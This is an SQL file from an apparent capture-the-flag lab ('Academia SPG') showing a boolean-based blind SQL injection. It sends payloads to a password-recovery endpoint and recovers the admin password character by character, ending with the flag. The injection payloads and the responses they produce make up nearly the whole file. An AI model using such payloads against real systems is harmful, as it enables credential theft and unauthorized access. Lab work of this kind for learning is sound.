-- =============================================================================
-- 02_password_extraction.sql
-- SQLi #2: Blind SQLi (Boolean & Temporal) | Academia SPG
-- -----------------------------------------------------------------------------
-- Target     : POST /recuperar  (vulnerable parameter: "user")
-- Technique  : Boolean-based blind SQL injection, character-by-character
-- Goal       : Reconstruct the admin password using SUBSTRING() as a
--              position-by-position TRUE/FALSE oracle. The password length
--              (8 characters) was already confirmed in 01_length_oracle.sql.
-- =============================================================================

-- Position 1 -----------------------------------------------------------------
-- user = admin' AND SUBSTRING(password,1,1)='a'-- -
SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 1, 1) = 'a'-- -' AND password_hash = '';
-- {"login":"no existe"}

-- user = admin' AND SUBSTRING(password,1,1)='e'-- -
SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 1, 1) = 'e'-- -' AND password_hash = '';
-- {"login":"no existe"}

-- user = admin' AND SUBSTRING(password,1,1)='s'-- -
SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 1, 1) = 's'-- -' AND password_hash = '';
-- {"login":"existe"}   *** position 1 = 's' ***

-- Position 2 -----------------------------------------------------------------
SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 2, 1) = 'a'-- -' AND password_hash = '';
-- {"login":"no existe"}

SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 2, 1) = 'e'-- -' AND password_hash = '';
-- {"login":"no existe"}

SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 2, 1) = '3'-- -' AND password_hash = '';
-- {"login":"existe"}   *** position 2 = '3' ***

-- Position 3 -----------------------------------------------------------------
SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 3, 1) = 'a'-- -' AND password_hash = '';
-- {"login":"no existe"}

SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 3, 1) = 'e'-- -' AND password_hash = '';
-- {"login":"no existe"}

SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 3, 1) = 'c'-- -' AND password_hash = '';
-- {"login":"existe"}   *** position 3 = 'c' ***

-- Position 4 -----------------------------------------------------------------
SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 4, 1) = 'a'-- -' AND password_hash = '';
-- {"login":"no existe"}

SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 4, 1) = 'e'-- -' AND password_hash = '';
-- {"login":"no existe"}

SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 4, 1) = 'r'-- -' AND password_hash = '';
-- {"login":"existe"}   *** position 4 = 'r' ***

-- Position 5 -----------------------------------------------------------------
SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 5, 1) = 'a'-- -' AND password_hash = '';
-- {"login":"no existe"}

SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 5, 1) = 'e'-- -' AND password_hash = '';
-- {"login":"no existe"}

SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 5, 1) = '3'-- -' AND password_hash = '';
-- {"login":"existe"}   *** position 5 = '3' ***

-- Position 6 -----------------------------------------------------------------
SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 6, 1) = 'a'-- -' AND password_hash = '';
-- {"login":"no existe"}

SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 6, 1) = 'e'-- -' AND password_hash = '';
-- {"login":"no existe"}

SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 6, 1) = 't'-- -' AND password_hash = '';
-- {"login":"existe"}   *** position 6 = 't' ***

-- Position 7 -----------------------------------------------------------------
SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 7, 1) = 'a'-- -' AND password_hash = '';
-- {"login":"no existe"}

SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 7, 1) = 'e'-- -' AND password_hash = '';
-- {"login":"no existe"}

SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 7, 1) = '4'-- -' AND password_hash = '';
-- {"login":"existe"}   *** position 7 = '4' ***

-- Position 8 -----------------------------------------------------------------
SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 8, 1) = 'a'-- -' AND password_hash = '';
-- {"login":"no existe"}

SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 8, 1) = 'e'-- -' AND password_hash = '';
-- {"login":"no existe"}

SELECT * FROM users
WHERE username = 'admin' AND SUBSTRING(password, 8, 1) = '2'-- -' AND password_hash = '';
-- {"login":"existe"}   *** position 8 = '2' ***

-- -----------------------------------------------------------------------------
-- Reconstructed password (positions 1-8, in order): s 3 c r 3 t 4 2
-- Flag: SPG{s3cr3t42}
-- =============================================================================
